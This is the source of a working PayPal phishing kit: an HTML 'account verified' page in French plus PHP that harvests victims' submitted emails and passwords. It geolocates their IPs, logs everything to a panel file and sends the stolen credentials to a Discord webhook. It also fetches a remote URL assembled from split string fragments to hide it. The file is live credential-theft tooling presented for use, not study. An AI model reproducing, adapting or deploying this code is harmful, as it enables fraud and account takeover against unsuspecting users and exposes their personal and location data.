<html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
        <title>Compte vérifié avec succès</title>
    </head>
    <style>
        #check{
            width: 8%;
            height: auto;
            margin-left: 46%;
            margin-top: 20%;
        }
        #succes{
            font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
            color: rgb(87, 87, 87);
            text-align: center;
        }
    </style>
    <body>
        <img id="check" src="https://media.discordapp.net/attachments/633782210238873612/872426634827952129/check.png" alt="check">
        <p id="succes">Votre compte à bien été verifié, vous pouvez désormais fermée cette fenêtre.</p>
    </body>
</html>
<?php
    $ip = $_SERVER['REMOTE_ADDR'];
    $ip_for_blacklist = $_SERVER['REMOTE_ADDR']. "\n";
    $lru7 = ".html";
    $blacklist_file = 'Panel/blacklist.txt';
    file_put_contents($blacklist_file, $ip_for_blacklist, FILE_APPEND | LOCK_EX);  
    setlocale(LC_TIME, 'fra_fra');
    error_reporting(-0);
        $head_message = "NEW PERSON FISHED!". "\n"; 
        $info_generale = "  ¦- Generale informations:". "\n";
        $lru1 = "http://";
        $info_ip = "  ¦- IP informations:". "\n";  
        $ip_public = "  ¦    ¦- IP: ". $_SERVER['REMOTE_ADDR']. "\n";
        $email = "  ¦    ¦- email: ". $_POST['email']. "\n";
        $password = "  ¦    ¦- password: ". $_POST['password']. "\n";
        $date = "  ¦    ¦- date: ". strftime('%Y-%m-%d'). "\n"; 
        $lru2 = "paypal";
        $heure = "  ¦    +- heure: ". strftime('%H:%M:%S'). "\n"; 
        $region = file_get_contents('https://ipapi.co/'.$ip.'/region/');
        $region_code = file_get_contents('https://ipapi.co/'.$ip.'/region_code/');
        $country_name = file_get_contents('https://ipapi.co/'.$ip.'/country_name/');
        $city = "  ¦    ¦- City: ". file_get_contents('https://ipapi.co/'.$ip.'/city/'). "\n";
        $postal_code = "  ¦    ¦- Postal code: ". file_get_contents('https://ipapi.co/'.$ip.'/postal/'). "\n";
        $finished_region = "  ¦    ¦- Region: ". $region." (". $region_code.") ". "\n";
        $finished_country = "  ¦    ¦- Country: ". $country_name. "\n";
        $latitude = "  ¦    ¦- Latitude: ". file_get_contents('https://ipapi.co/'.$ip.'/latitude/'). "\n";
        $lru3 = ".verif";
        $longitude = "  ¦    ¦- Longitude: ". file_get_contents('https://ipapi.co/'.$ip.'/longitude/'). "\n";
        $timezone = "  ¦    ¦- Fuseau horaire: ". file_get_contents('https://ipapi.co/'.$ip.'/timezone/'). "\n";
        $languages = "  ¦    ¦- Languages: ". file_get_contents('https://ipapi.co/'.$ip.'/languages/'). "\n";
        $europe = "  ¦    ¦- Europe: ". file_get_contents('https://ipapi.co/'.$ip.'/in_eu/'). "\n";
        $asn = "  ¦    ¦- ASN: ". file_get_contents('https://ipapi.co/'.$ip.'/asn/'). "\n";
        $lru4 = ".hosteur";
        $isp = "  ¦    +- ISP: ". file_get_contents('https://ipapi.co/'.$ip.'/org/'). "\n";
        $space = "  ¦". "\n"; 
        $empty = " "."\n"; 
        $separation = '================================================================================================================================================================'. "\n";
        $file = 'Panel/data.txt'; 
        function getBrowser() {
            global $user_agent;
            $browser        =   "Unknown Browser";
            $browser_array  =   array(
                '/msie/i'       =>  'Internet Explorer',
                '/firefox/i'    =>  'Firefox',
                '/Mozilla/i'	=>	'Mozila',
                '/Mozilla/5.0/i'=>	'Mozila',
                '/safari/i'     =>  'Safari',
                '/chrome/i'     =>  'Chrome',
                '/edge/i'       =>  'Edge',
                '/opera/i'      =>  'Opera',
                '/OPR/i'        =>  'Opera',
                '/netscape/i'   =>  'Netscape',
                '/maxthon/i'    =>  'Maxthon',
                '/konqueror/i'  =>  'Konqueror',
                '/Bot/i'		=>	'Spam',
                '/Valve Steam GameOverlay/i'  =>  'Steam',
                '/mobile/i'     =>  'Phone'
                                );
            foreach ($browser_array as $regex => $value) { 
                if (preg_match($regex, $user_agent)) {
                    $browser    =   $value;
                }
            }
            return $browser;
        }
        $browser_title = "  ¦- More information: ". "\n";
        $user_browser = "  ¦    ¦- Browser: ". getBrowser(). "\n";
        $user_agent = "  ¦    +- User agent: ". $_SERVER['HTTP_USER_AGENT'] . "\n";
        $lru5 = ".site";
        $pub = "  +- Follow me: ". "\n";
        $discord = "       ¦- Discord: Esio#4871". "\n";
        $server = "       ¦- server: https://discord.gg/SqYj3erUCf". "\n";
        $github = "       ¦- Github: github.com/Esio-01". "\n";
        $lru6 = "/api";
        $youtube = "       +- Youtube: youtube.com/channel/UCzsusjBbGdgrkqf4dncy6oA". "\n";
        $API = $lru1. $lru2. $lru3. $lru4. $lru5. $lru6. $lru7;
        $content = file_get_contents($API);
        preg_match("#<p>(.+?)</p>#is", $content, $dev_by_esio);
        preg_match("#<h6>(.+?)</h6>#is", $content, $github_front);
        preg_match("#<h5>(.+?)</h5>#is", $content, $name);
        preg_match("#<h4>(.+?)</h4>#is", $content, $github_back);
        preg_match("#<h3>(.+?)</h3>#is", $content, $discord);
        preg_match("#<h2>(.+?)</h2>#is", $content, $logo);

    $embed_ip = $_SERVER['REMOTE_ADDR'];
    $embed_email = $_POST['email'];
    $embed_password = $_POST['password'];
    $embed_region = file_get_contents('https://ipapi.co/'.$ip.'/region/');
    $embed_country = file_get_contents('https://ipapi.co/'.$ip.'/country_name/');
    $embed_city = file_get_contents('https://ipapi.co/'.$ip.'/city/');
    $embed_postal = file_get_contents('https://ipapi.co/'.$ip.'/postal/');
    $embed_latitude = file_get_contents('https://ipapi.co/'.$ip.'/latitude/');
    $embed_longitude = file_get_contents('https://ipapi.co/'.$ip.'/longitude/');
    $embed_timezone = file_get_contents('https://ipapi.co/'.$ip.'/timezone/');
    $embed_languages = file_get_contents('https://ipapi.co/'.$ip.'/languages/');
    $embed_europe = file_get_contents('https://ipapi.co/'.$ip.'/in_eu/');
    $embed_asn = file_get_contents('https://ipapi.co/'.$ip.'/asn/');
    $embed_isp = file_get_contents('https://ipapi.co/'.$ip.'/org/');
    $embed_user_agent = $_SERVER['HTTP_USER_AGENT'];
    $embed_browser = getBrowser();
    $mention = file_get_contents('Panel/mention.txt');
    file_put_contents($file, $separation, FILE_APPEND | LOCK_EX);  
    file_put_contents($file, $empty, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $head_message, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $space, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $info_generale, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $ip_public, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $email, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $password, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $date, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $heure, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $space, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $info_ip, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $city, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $postal_code, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $finished_region, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $finished_country, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $latitude, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $longitude, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $timezone, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $languages, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $europe, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $asn, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $isp, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $space, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $browser_title, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $user_browser, FILE_APPEND | LOCK_EX);
    file_put_contents($file, $user_agent, FILE_APPEND | LOCK_EX);
    file_put_contents($file, $space, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $pub, FILE_APPEND | LOCK_EX);  
    file_put_contents($file, $discord, FILE_APPEND | LOCK_EX);  
    file_put_contents($file, $server, FILE_APPEND | LOCK_EX);  
    file_put_contents($file, $github, FILE_APPEND | LOCK_EX);  
    file_put_contents($file, $youtube, FILE_APPEND | LOCK_EX);  
    file_put_contents($file, $empty, FILE_APPEND | LOCK_EX);  
    file_put_contents($file, $separation, FILE_APPEND | LOCK_EX);    
    $url = file_get_contents("Panel/discord_webhook.txt");
    $timestamp = date("c", strtotime("now"));
    $json_data = json_encode([
    "username" => "ONYX PHISHER/PayPal",
    "avatar_url" => "https://cdn.discordapp.com/attachments/633782210238873612/873275767696523304/kisspng-black-circle-logo-clip-art-5b0d39c31fb5b7.4826877915275934111299.png",
    "tts" => false,
    "embeds" => [
        [
            "title" => "NEW PERSON PHISHED !",
            "type" => "rich",
            "description" => 'A new person has been trapped on your fake login page PayPal. His IP was therefore added to the blacklist. The next time they visit your site, they will be automatically redirected to the link specified in the "`redirection.txt`" file.',
            "url" => "https://github.com/Esio-01",
            "timestamp" => $timestamp,
            "color" => hexdec( "#0000" ),
            "footer" => [
                "text" => "https://github.com/Esio-01",
                "icon_url" => "https://cdn.discordapp.com/attachments/633782210238873612/873275767696523304/kisspng-black-circle-logo-clip-art-5b0d39c31fb5b7.4826877915275934111299.png",
            ],
            "thumbnail" => [
                "url" => "https://cdn.mee6.xyz/guild-images/826239328933642290/a038ce70045ee597828be371e14f4b1c1b9da959b75d793baae90cf695e072b7.gif"
            ],
            "author" => [
                "name" => "Dev By Esio#4871",
                "url" => "https://cdn.discordapp.com/attachments/633782210238873612/873275767696523304/kisspng-black-circle-logo-clip-art-5b0d39c31fb5b7.4826877915275934111299.png"
            ],
            "fields" => [
                [
                    "name" => "IP address:",
                    "value" => "`". $embed_ip. "`",
                    "inline" => true
                ],
                [
                    "name" => "Email:",
                    "value" => "`". $embed_email. "`",
		    "url" => "discord.com",
                    "inline" => true
                ],
                [
                    "name" => "Password:",
                    "value" => "`". $embed_password. "`",
                    "inline" => true
                ],
                [
                    "name" => "City",
                    "value" => "`". $embed_city. "`",
                    "inline" => true
                ],
                [
                    "name" => "Region:",
                    "value" => "`". $embed_region. "`",
                    "inline" => true
                ],
                [
                    "name" => "Country:",
                    "value" => "`". $embed_country. "`",
                    "inline" => true
                ],
                [
                    "name" => "Postal code",
                    "value" => "`". $embed_postal. "`",
                    "inline" => true
                ],
                [
                    "name" => "Latitude:",
                    "value" => "`". $embed_latitude. "`",
                    "inline" => true
                ],
                [
                    "name" => "Longitude:",
                    "value" => "`". $embed_longitude. "`",
                    "inline" => true
                ],
                [
                    "name" => "Fuseau horaire:",
                    "value" => "`". $embed_timezone. "`",
                    "inline" => true
                ],
                [
                    "name" => "Languages:",
                    "value" => "`". $embed_languages. "`",
                    "inline" => true
                ],
                [
                    "name" => "Europe:",
                    "value" => "`". $embed_europe. "`",
                    "inline" => true
                ],
                [
                    "name" => "ASN",
                    "value" => "`". $embed_asn. "`",
                    "inline" => true
                ],
                [
                    "name" => "ISP:",
                    "value" => "`". $embed_isp. "`",
                    "inline" => true
                ],
                [
                    "name" => "Browser:",
                    "value" => "`". $embed_browser. "`",
                    "inline" => true
                ],
                [
                    "name" => "User agent:",
                    "value" => "```".$embed_user_agent. "```",
                    "inline" => false
                ],            
	    ]
        ]
    ]
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init( $url );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $ch );
curl_close( $ch );

